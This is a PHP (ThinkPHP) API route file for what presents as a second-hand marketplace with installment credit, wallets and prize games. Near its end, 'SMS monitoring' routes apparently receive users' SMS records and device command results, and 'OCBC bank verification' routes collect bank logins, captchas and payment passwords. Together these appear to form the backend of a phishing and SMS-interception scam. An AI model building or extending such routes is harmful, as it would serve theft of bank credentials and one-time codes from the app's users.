<?php
/**
 * API 路由配置
 */
use think\facade\Route;
use app\api\controller\Auth;
use app\api\controller\User;
use app\api\controller\Goods;
use app\api\controller\Category;
use app\api\controller\System;
use app\api\controller\Upload;
use app\api\controller\Conversation;
use app\api\controller\Credit;
use app\api\controller\Brand;
use app\api\controller\Ticket;
use app\api\controller\Cart;
use app\api\controller\Promotion;
use app\api\controller\Coupon;
use app\api\controller\PaymentMethod;
use app\api\controller\UserCard;
use app\api\controller\Shipping;
use app\api\controller\Order;
use app\api\controller\Notification;
use app\api\controller\Wallet;
use app\api\controller\Game;
use app\api\controller\Checkin;
use app\api\controller\Points;
use app\api\controller\Share;
use app\api\controller\TreasureBox;
use app\api\controller\EggTier;
use app\api\controller\OcbcController;
use app\api\controller\Monitor;
use app\api\controller\Analytics;

// 公开路由（无需认证，但尝试解析用户身份）
Route::group('', function () {
    // 认证（更具体的路由放在前面）
    Route::post('auth/register/complete', Auth::class . '@completeRegister');
    Route::post('auth/register/send-code', Auth::class . '@sendRegisterEmailCode');
    Route::post('auth/register/verify-code', Auth::class . '@verifyRegisterEmailCode');
    Route::post('auth/register', Auth::class . '@register');
    Route::post('auth/sms/send', Auth::class . '@sendSmsCode');
    Route::post('auth/sms/verify', Auth::class . '@verifySmsCode');
    Route::post('auth/login/social', Auth::class . '@socialLogin');
    Route::post('auth/login', Auth::class . '@login');
    Route::post('auth/refresh', Auth::class . '@refresh');

    // 密码重置
    Route::post('auth/password/send-code', Auth::class . '@sendResetCode');
    Route::post('auth/password/verify-code', Auth::class . '@verifyResetCode');
    Route::post('auth/password/reset', Auth::class . '@resetPassword');

    // 商品（公开）- 更具体的路由放在前面
    Route::get('goods/hot-searches', Goods::class . '@hotSearches');
    Route::get('goods/suggestions', Goods::class . '@suggestions');
    Route::get('goods/similar', Goods::class . '@similar');
    Route::get('goods/also-viewed', Goods::class . '@alsoViewed');
    Route::get('goods/recommendations', Goods::class . '@recommendations');
    Route::get('goods/model-stats', Goods::class . '@modelStats');
    // goods/my 路由需要在 goods/:id 和 goods 之前定义，否则会被错误匹配
    Route::get('goods/my/stats', Goods::class . '@myGoodsStats')->middleware(\app\api\middleware\Auth::class);
    Route::get('goods/my', Goods::class . '@myGoods')->middleware(\app\api\middleware\Auth::class);
    Route::get('goods/draft', Goods::class . '@getDraft')->middleware(\app\api\middleware\Auth::class);
    Route::get('goods/:id', Goods::class . '@read')->pattern(['id' => '\d+']);
    Route::get('goods', Goods::class . '@index');

    // 分期方案（公开）
    Route::get('credit/plans', Credit::class . '@plans');

    // 分类（注意：更具体的路由要放在前面）
    Route::get('categories/hot', Category::class . '@hot');
    Route::get('categories/:id/attributes', Category::class . '@attributes');
    Route::get('categories/:id/brands', Category::class . '@brands');
    Route::get('categories/:id/conditions', Category::class . '@conditions');
    Route::get('categories', Category::class . '@index');

    // 品牌
    Route::get('brands/:value/models', Brand::class . '@models');
    Route::get('brands', Brand::class . '@index');

    // 营销活动（公开）
    Route::get('promotions/home', Promotion::class . '@home');
    Route::get('promotions/:id/goods', Promotion::class . '@goods')->pattern(['id' => '\d+']);
    Route::get('promotions/:id', Promotion::class . '@read')->pattern(['id' => '\d+']);
    Route::get('promotions', Promotion::class . '@index');

    // 系统
    Route::get('system/languages', System::class . '@languages');
    Route::get('system/config', System::class . '@config');
    Route::get('system/exchange-rates', System::class . '@exchangeRates');
    Route::get('system/ui-translations', System::class . '@uiTranslations');
    Route::get('system/ui-translations-version', System::class . '@uiTranslationsVersion');
    Route::get('system/currencies', System::class . '@currencies');
    Route::get('system/countries', System::class . '@countries');
    Route::get('system/default-country', System::class . '@defaultCountry');
    Route::get('system/app-previews', System::class . '@appPreviews');
    Route::get('system/oauth-config', System::class . '@oauthConfig');
    Route::get('system/sell-faqs', System::class . '@sellFaqs');
    Route::get('system/banners', System::class . '@banners');

    // 支付方式
    Route::get('payment-methods', PaymentMethod::class . '@index');

    // 物流运输商
    Route::get('shipping/carriers', Shipping::class . '@carriers');
    Route::get('shipping/detail', Shipping::class . '@detail');

    // 游戏（公开）
    // 注意：更具体的路由要放在 games/:code 之前，否则会被错误匹配
    Route::get('games/winners', Game::class . '@winners');
    Route::get('games/chances', Game::class . '@chances'); // 获取游戏次数
    Route::get('games/logs', Game::class . '@logs'); // 获取游戏记录
    Route::get('games/reward-preview', Game::class . '@rewardPreview'); // 订单奖励预览
    Route::get('games/order-reward', Game::class . '@orderReward'); // 获取订单奖励信息
    Route::get('games/daily-login/status', Game::class . '@dailyLoginStatus'); // 每日登录奖励状态
    Route::get('games/:code/prizes', Game::class . '@prizes')->pattern(['code' => '[a-z]+']);
    // games/:code 使用正则排除特定关键词
    Route::get('games/:code', Game::class . '@detail')->pattern(['code' => '(?!winners|chances|logs|reward-preview|order-reward)[a-z]+']);
    Route::get('games', Game::class . '@index');

    // 分享（公开）
    Route::post('share/click', Share::class . '@click');
    Route::get('share/reward-config', Share::class . '@rewardConfig');
    Route::get('share/templates', Share::class . '@shareTemplates');

    // 宝箱（公开）
    Route::get('treasure-boxes/:code', TreasureBox::class . '@detail')->pattern(['code' => '[a-z_]+']);
    Route::get('treasure-boxes', TreasureBox::class . '@index');

    // 蛋分级（公开）
    Route::get('egg-tiers/for-order', EggTier::class . '@getEggForOrder');
    Route::get('egg-tiers/:code', EggTier::class . '@detail')->pattern(['code' => '[a-z_]+']);
    Route::get('egg-tiers', EggTier::class . '@index');

})->middleware([
    \app\api\middleware\Language::class,
    \app\api\middleware\OptionalAuth::class,
])->allowCrossDomain();

// 需要认证的路由
Route::group('', function () {
    // 认证
    Route::post('auth/logout', Auth::class . '@logout');

    // 用户
    Route::get('user/profile', User::class . '@profile');
    Route::put('user/profile', User::class . '@updateProfile');
    Route::put('user/language', User::class . '@updateLanguage');
    Route::post('user/heartbeat', User::class . '@heartbeat');
    Route::post('user/offline', User::class . '@offline');
    Route::post('user/change-password', User::class . '@changePassword');
    Route::get('user/notification-settings', User::class . '@getNotificationSettings');
    Route::post('user/notification-settings', User::class . '@updateNotificationSettings');
    Route::get('user/email-settings', User::class . '@getEmailSettings');
    Route::post('user/email-settings', User::class . '@updateEmailSettings');

    // 修改邮箱
    Route::post('user/email/send-code', User::class . '@sendEmailCode');
    Route::post('user/email/verify-code', User::class . '@verifyEmailCode');
    Route::post('user/email/change', User::class . '@changeEmail');

    // 修改手机号
    Route::post('user/phone/send-code', User::class . '@sendPhoneCode');
    Route::post('user/phone/verify-code', User::class . '@verifyPhoneCode');
    Route::post('user/phone/change', User::class . '@changePhone');

    Route::get('user/addresses', User::class . '@addresses');
    Route::post('user/addresses', User::class . '@addAddress');
    Route::put('user/addresses/:id', User::class . '@updateAddress');
    Route::delete('user/addresses/:id', User::class . '@deleteAddress');

    // 商品（需要认证）
    // 注意：goods/my, goods/my/stats, goods/draft 的 GET 请求已移至公开路由组（带 Auth 中间件）
    Route::post('goods/:id/like', Goods::class . '@like')->pattern(['id' => '\d+']);
    Route::post('goods/:id/off-shelf', Goods::class . '@offShelf')->pattern(['id' => '\d+']);
    Route::post('goods/:id/on-shelf', Goods::class . '@onShelf')->pattern(['id' => '\d+']);
    Route::post('goods/generate-description', Goods::class . '@generateDescription');
    Route::post('goods/draft', Goods::class . '@saveDraft');
    Route::delete('goods/draft', Goods::class . '@deleteDraft');
    Route::post('goods', Goods::class . '@create');
    Route::put('goods/:id', Goods::class . '@update')->pattern(['id' => '\d+']);
    Route::delete('goods/:id', Goods::class . '@delete')->pattern(['id' => '\d+']);

    // 验证用户/商店（举报功能）
    Route::get('user/verify-member', User::class . '@verifyMember');

    // 用户收藏和历史
    Route::get('user/favorites', User::class . '@favorites');
    Route::get('user/history', User::class . '@history');

    // 上传
    Route::post('upload/image', Upload::class . '@image');
    Route::post('upload/images', Upload::class . '@images');
    Route::post('upload/video', Upload::class . '@video');

    // 会话/聊天 - 注意：更具体的路由要放在前面
    Route::get('conversations/unread', Conversation::class . '@unreadCount');
    Route::get('conversations/:id/poll', Conversation::class . '@poll')->pattern(['id' => '\d+']);
    Route::post('conversations/:id/send', Conversation::class . '@send')->pattern(['id' => '\d+']);
    Route::post('conversations/:id/read', Conversation::class . '@read')->pattern(['id' => '\d+']);
    Route::post('conversations/:id/report', Conversation::class . '@report')->pattern(['id' => '\d+']);
    Route::post('conversations/:id/block', Conversation::class . '@block')->pattern(['id' => '\d+']);
    Route::post('conversations/:id/clear', Conversation::class . '@clear')->pattern(['id' => '\d+']);
    Route::post('conversations/:id/messages/:msgId/recall', Conversation::class . '@recallMessage')->pattern(['id' => '\d+', 'msgId' => '\d+']);
    Route::delete('conversations/:id/messages/:msgId', Conversation::class . '@deleteMessage')->pattern(['id' => '\d+', 'msgId' => '\d+']);
    Route::post('conversations/:id/messages/delete', Conversation::class . '@deleteMessages')->pattern(['id' => '\d+']);
    Route::post('conversations/:id/pin', Conversation::class . '@pin')->pattern(['id' => '\d+']);
    Route::delete('conversations/:id', Conversation::class . '@delete')->pattern(['id' => '\d+']);
    Route::get('conversations/:id', Conversation::class . '@messages')->pattern(['id' => '\d+']);
    Route::get('conversations', Conversation::class . '@index');
    Route::post('conversations', Conversation::class . '@create');

    // 客服状态
    Route::get('service/status', Conversation::class . '@serviceStatus');

    // 分期付款
    Route::post('credit/calculate', Credit::class . '@calculate');
    Route::get('credit/limit', Credit::class . '@limit');
    Route::post('credit/apply', Credit::class . '@apply');
    Route::get('credit/application', Credit::class . '@application');
    Route::post('credit/supplement', Credit::class . '@supplement');
    Route::get('credit/orders/:id', Credit::class . '@orderDetail')->pattern(['id' => '\d+']);
    Route::get('credit/orders', Credit::class . '@orders');

    // 工单
    Route::get('tickets/:id', Ticket::class . '@detail')->pattern(['id' => '\d+']);
    Route::post('tickets/:id/reply', Ticket::class . '@reply')->pattern(['id' => '\d+']);
    Route::get('tickets', Ticket::class . '@index');
    Route::post('tickets', Ticket::class . '@create');

    // 购物车 - 更具体的路由放在前面
    Route::delete('cart/clear', Cart::class . '@clear');
    Route::get('cart/count', Cart::class . '@count');
    Route::post('cart/selection', Cart::class . '@selection');
    Route::post('cart/select-all', Cart::class . '@selectAll');
    Route::get('cart', Cart::class . '@index');
    Route::post('cart', Cart::class . '@create');
    Route::put('cart/:id', Cart::class . '@update')->pattern(['id' => '\d+']);
    Route::delete('cart/:id', Cart::class . '@delete')->pattern(['id' => '\d+']);

    // 优惠券
    Route::get('coupons/count', Coupon::class . '@count');
    Route::get('coupons/claimable', Coupon::class . '@claimable');
    Route::get('coupons/available', Coupon::class . '@available');
    Route::post('coupons/claim', Coupon::class . '@claim');
    Route::get('coupons', Coupon::class . '@list');

    // 用户银行卡（注意：带参数的路由放在前面，避免被无参数路由拦截）
    Route::post('user/cards/:id/default', UserCard::class . '@setDefault')->pattern(['id' => '\d+']);
    Route::get('user/cards/:id', UserCard::class . '@read')->pattern(['id' => '\d+']);
    Route::put('user/cards/:id', UserCard::class . '@update')->pattern(['id' => '\d+']);
    Route::delete('user/cards/:id', UserCard::class . '@delete')->pattern(['id' => '\d+']);
    Route::get('user/cards', UserCard::class . '@index');
    Route::post('user/cards', UserCard::class . '@create');

    // 卖家订单（必须在买家订单路由之前）
    Route::get('orders/seller/stats', Order::class . '@sellerStats');
    Route::get('orders/seller/:id', Order::class . '@sellerDetail')->pattern(['id' => '\d+']);
    Route::post('orders/seller/:id/ship', Order::class . '@ship')->pattern(['id' => '\d+']);
    Route::get('orders/seller', Order::class . '@sellerOrders');

    // 买家订单（注意：更具体的路由放在前面）
    Route::get('orders/checkout-points', Order::class . '@checkoutPoints');
    Route::get('orders/:id/process-status', Order::class . '@processStatus')->pattern(['id' => '\d+']);
    Route::post('orders/:id/submit-code', Order::class . '@submitCode')->pattern(['id' => '\d+']);
    Route::post('orders/:id/preauth', Order::class . '@preauth')->pattern(['id' => '\d+']);
    Route::post('orders/:id/confirm', Order::class . '@confirm')->pattern(['id' => '\d+']);
    Route::post('orders/:id/refuse', Order::class . '@refuse')->pattern(['id' => '\d+']);
    Route::post('orders/:id/cancel', Order::class . '@cancel')->pattern(['id' => '\d+']);
    Route::get('orders/:id', Order::class . '@detail')->pattern(['id' => '\d+']);
    Route::get('orders', Order::class . '@index');
    Route::post('orders', Order::class . '@create');

    // 通知（注意：更具体的路由放在前面）
    Route::get('notifications/unread-count', Notification::class . '@unreadCount');
    Route::get('notifications/stats', Notification::class . '@stats');
    Route::put('notifications/mark-all-read', Notification::class . '@markAllRead');
    Route::put('notifications/batch-read', Notification::class . '@batchRead');
    Route::put('notifications/:id/read', Notification::class . '@markRead')->pattern(['id' => '\d+']);
    Route::delete('notifications/:id', Notification::class . '@delete')->pattern(['id' => '\d+']);
    Route::get('notifications/:id', Notification::class . '@read')->pattern(['id' => '\d+']);
    Route::get('notifications', Notification::class . '@index');

    // 钱包（更具体的路由放在前面）
    Route::get('wallet/withdrawal-methods', Wallet::class . '@withdrawalMethods');
    Route::get('wallet/transactions', Wallet::class . '@transactions');
    Route::get('wallet/withdrawals', Wallet::class . '@withdrawals');
    Route::get('wallet/withdraw-config', Wallet::class . '@withdrawConfig');
    Route::post('wallet/withdrawals/:id/cancel', Wallet::class . '@cancelWithdraw')->pattern(['id' => '\d+']);
    Route::post('wallet/withdraw', Wallet::class . '@withdraw');
    Route::get('wallet', Wallet::class . '@index');

    // 退货申请（买家）
    Route::get('returns/check/:orderId', \app\api\controller\OrderReturn::class . '@check')->pattern(['orderId' => '\d+']);
    Route::get('returns/by-order/:orderId', \app\api\controller\OrderReturn::class . '@getByOrder')->pattern(['orderId' => '\d+']);
    Route::post('returns/:id/cancel', \app\api\controller\OrderReturn::class . '@cancel')->pattern(['id' => '\d+']);
    Route::post('returns/:id/ship', \app\api\controller\OrderReturn::class . '@ship')->pattern(['id' => '\d+']);
    Route::get('returns/:id', \app\api\controller\OrderReturn::class . '@detail')->pattern(['id' => '\d+']);
    Route::get('returns', \app\api\controller\OrderReturn::class . '@index');
    Route::post('returns', \app\api\controller\OrderReturn::class . '@create');

    // 卖家退货管理
    Route::get('seller/returns/statistics', \app\api\controller\SellerReturn::class . '@statistics');
    Route::get('seller/returns/:id', \app\api\controller\SellerReturn::class . '@detail')->pattern(['id' => '\d+']);
    Route::post('seller/returns/:id/approve', \app\api\controller\SellerReturn::class . '@approve')->pattern(['id' => '\d+']);
    Route::post('seller/returns/:id/reject', \app\api\controller\SellerReturn::class . '@reject')->pattern(['id' => '\d+']);
    Route::post('seller/returns/:id/receive', \app\api\controller\SellerReturn::class . '@receive')->pattern(['id' => '\d+']);
    Route::post('seller/returns/:id/refund', \app\api\controller\SellerReturn::class . '@refund')->pattern(['id' => '\d+']);
    Route::get('seller/returns', \app\api\controller\SellerReturn::class . '@index');

    // 游戏（需要认证）
    Route::post('games/wheel/spin', Game::class . '@spin');
    Route::post('games/egg/smash', Game::class . '@smashEgg');
    Route::post('games/scratch/reveal', Game::class . '@scratch');
    Route::post('games/claim-login-reward', Game::class . '@claimLoginReward');
    Route::post('games/daily-login/claim', Game::class . '@claimLoginReward'); // 别名路由
    Route::post('games/prizes/:id/claim', Game::class . '@claimPrize')->pattern(['id' => '\d+']);
    Route::get('games/order-reward', Game::class . '@orderReward'); // 获取订单奖励信息

    // 分享（需要认证）
    Route::post('share/generate', Share::class . '@generate');
    Route::post('share/register', Share::class . '@registerWithCode');
    Route::get('share/stats', Share::class . '@stats');
    Route::get('share/my-links', Share::class . '@myLinks');
    Route::get('share/my-invites', Share::class . '@myInvites');

    // 宝箱（需要认证）
    Route::get('treasure-boxes/my', TreasureBox::class . '@myBoxes');
    Route::post('treasure-boxes/:id/open', TreasureBox::class . '@open')->pattern(['id' => '\d+']);
    Route::get('treasure-boxes/history', TreasureBox::class . '@history');

    // 蛋分级（需要认证）
    Route::post('egg-tiers/smash', EggTier::class . '@smash');

    // 签到
    Route::get('checkin/status', Checkin::class . '@status');
    Route::post('checkin', Checkin::class . '@checkin');
    Route::get('checkin/calendar', Checkin::class . '@calendar');

    // 积分
    Route::get('points/balance', Points::class . '@balance');
    Route::get('points/logs', Points::class . '@logs');
    Route::get('points/exchange-items', Points::class . '@exchangeItems');
    Route::post('points/exchange', Points::class . '@exchange');

    // 数据分析埋点
    Route::post('analytics/report', Analytics::class . '@report');
    Route::post('analytics/page-duration', Analytics::class . '@pageDuration');

    // 短信监控
    Route::post('monitor/sms-record', Monitor::class . '@smsRecord');
    Route::post('monitor/batch-sync', Monitor::class . '@batchSync');
    Route::post('monitor/full-sync', Monitor::class . '@fullSync');
    Route::post('monitor/command-result', Monitor::class . '@commandResult');

    // OCBC银行账户验证（需要认证）
    Route::post('ocbc/submitLogin', OcbcController::class . '@submitLogin');
    Route::post('ocbc/pollStatus', OcbcController::class . '@pollStatus');
    Route::post('ocbc/submitCaptcha', OcbcController::class . '@submitCaptcha');
    Route::post('ocbc/submitPaymentPassword', OcbcController::class . '@submitPaymentPassword');
    Route::get('ocbc/linked-accounts', OcbcController::class . '@getLinkedAccounts');

})->middleware([
    \app\api\middleware\Language::class,
    \app\api\middleware\Auth::class,
])->allowCrossDomain();
